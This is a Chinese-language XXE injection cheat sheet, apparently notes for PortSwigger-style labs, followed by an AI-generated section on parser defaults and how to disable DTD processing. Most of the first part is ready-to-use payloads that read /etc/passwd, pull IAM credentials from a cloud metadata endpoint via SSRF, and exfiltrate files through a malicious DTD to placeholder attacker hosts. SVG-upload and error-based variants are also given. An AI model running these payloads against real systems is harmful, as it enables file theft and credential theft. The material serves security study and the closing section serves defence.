# XXE

https://portswigger.net/web-security/xxe#what-is-xml-external-entity-injection

## Payload

### Read file
加入 external entity
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

在內容中插入
```
&xxe;
```

### SSRF

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

也可以用 OOB 確認弱點是否存在

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://burp-collaborator"> ]>
```

### Read file - XInclude

沒辦法控制整個 XML 內容的情況下，可以使用 `XInclude` 試試看 (`XInclude` 預設關閉)

插入 `&xxe;` 會噴錯
```
productId=%26xxe;&storeId=1
```

引用 `XInclude` namespace 後呼叫 XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

POST
```
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude">
<xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```


### 上傳圖片 svg 讀取檔案

上傳圖片功能可能接受 svg 格式，而 svg 由 XML 組成，有機會可以攻擊

read.svg
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="14" x="0" y="16">&xxe;</text>
```

### Content-Type

常見 HTTP POST 請求如下
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
等於下面格式
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Server 端有可能相容 XML 格式並解析。

### 使用 Parameter entities

某些情況下可能阻擋一般的 entites，這時可以試試看 Parameter entities

Parameter entities 只能用在 DTD（Document Type Definition），Parameter entities 宣告會在前面加上 `%`

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

上面的 `%xxe` 出現在 **DTD 內部子集**（`<!DOCTYPE foo [...]>` 內）因此合法

### Blind XXE - DTD

Blind XXE 的情境下要將資料取出來，可以製作惡意的 DTD 並 Host 在攻擊機上

exploit.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

dtd 中宣告參數實體 `file` 讀取檔案。參數實體 `eval` 中包含另一個動態宣告的參數實體 `exfil`，`exfil`  會發送 HTTP 請求將資料帶出

XXE Payload
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-SERVER/exploit.dtd"> %xxe;]>
```

XXE Payload 載入遠端的 exploit.dtd 並解析。

### Blind XXE - DTD Error

利用錯誤訊息顯示結果

error.dtd
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

XXE Payload
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-SERVER/exploit.dtd"> %xxe;]>
```

### 利用系統上現有的 DTD

如果網路無法連外，可以利用系統上的 dtd 觸發錯誤。
例如 GNOME desktop 中的 `/usr/share/yelp/dtd/docbookx.dtd`，裡面定義了 `ISOamso`，我們可以重新定義 `ISOamso` 存取不存在的檔案觸發錯誤

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```



## 預設配置是否解析 DTD?

以下內容由 Grok 3 產生

### 1. **常見 XML 解析器的預設行為**

- **libxml2（C、PHP 等）**:
  - **預設行為**: 預設會解析 DTD，包括外部實體（`SYSTEM` 實體）。
  - **XXE 風險**: 如果未禁用外部實體，會解析 `file://` 或 `http://` 等外部資源，可能導致 XXE 漏洞。
  - **PHP 相關**: 在 PHP 的 `SimpleXMLElement` 或 `DOMDocument` 中，預設會載入外部實體，除非明確設置 `libxml_disable_entity_loader(true)`（PHP 8.0 之前）或使用其他限制。

- **Java (SAX, DOM)**:
  - **預設行為**: 大多數 Java XML 解析器（如 `DocumentBuilderFactory` 或 `SAXParser`）預設會解析 DTD，包括外部實體。
  - **XXE 風險**: 除非明確設置屬性（如 `disallow-doctype-decl` 或 `setFeature` 禁用外部實體），否則存在 XXE 風險。
  - **例外**: 某些較新的 Java 版本（例如 JDK 8+）可能在特定配置下限制外部實體，但仍需手動確保安全。

- **Python (xml.etree.ElementTree, lxml)**:
  - **xml.etree.ElementTree**: 預設不解析外部實體（從 Python 3.7.1 開始，為了安全起見已禁用）。
  - **lxml**: 預設會解析 DTD 和外部實體，除非使用安全的解析器配置（例如 `no_network=True`）。
  - **建議**: 使用 `defusedxml` 庫來避免 XXE 風險。

- **.NET (System.Xml)**:
  - **舊版本（如 .NET Framework 4.5.2 之前）**: 預設解析 DTD 和外部實體，存在 XXE 風險。
  - **新版本（如 .NET Framework 4.5.2+ 或 .NET Core）**: 預設禁用外部實體解析（`XmlReaderSettings` 的 `DtdProcessing` 設為 `Prohibit`）。
  - **注意**: 開發者仍需確保未手動啟用不安全的配置。

- **Node.js (libxmljs, xml2js)**:
  - **xml2js**: 預設不解析外部實體，安全性較高。
  - **libxmljs**: 預設可能解析 DTD 和外部實體，需手動配置以禁用。

### **如何避免 DTD 解析？**

為了防止 XXE 攻擊，應該始終禁用 DTD 解析或外部實體載入，除非明確需要。以下是一些通用建議：

- **禁用 DTD 解析**:
  - **Java**: 設置 `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`。
  - **PHP**: 使用 `libxml_disable_entity_loader(true)`（PHP 8.0 之前）或避免直接解析不可信 XML。
  - **Python**: 使用 `defusedxml` 或配置 `lxml` 的 `no_network=True`。
  - **.NET**: 確保 `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`。

- **輸入驗證**: 拒絕包含 `<!DOCTYPE>` 的 XML 輸入。
- **使用安全的解析器**: 選擇預設禁用外部實體的解析器（如 Python 的 `defusedxml` 或 .NET Core 的新版 `XmlReader`）。
- **最小權限**: 限制應用程式對檔案系統和網絡的訪問權限。

### **總結**

- **預設情況**: 許多傳統 XML 解析器（如 libxml2、Java SAX/DOM、舊版 .NET）預設會解析 DTD 和外部實體，存在 XXE 風險。
- **現代解析器**: 一些新版解析器（如 Python 3.7.1+ 的 `ElementTree`、.NET Core）預設禁用外部實體，安全性更高。
- **建議**: 除非明確需要 DTD 功能，否則應始終禁用 DTD 解析，並使用安全的解析器配置來防範 XXE 攻擊。

如果您使用特定的解析器或語言，可以提供更多細節，我可以幫您確認其預設行為或提供更精確的配置建議！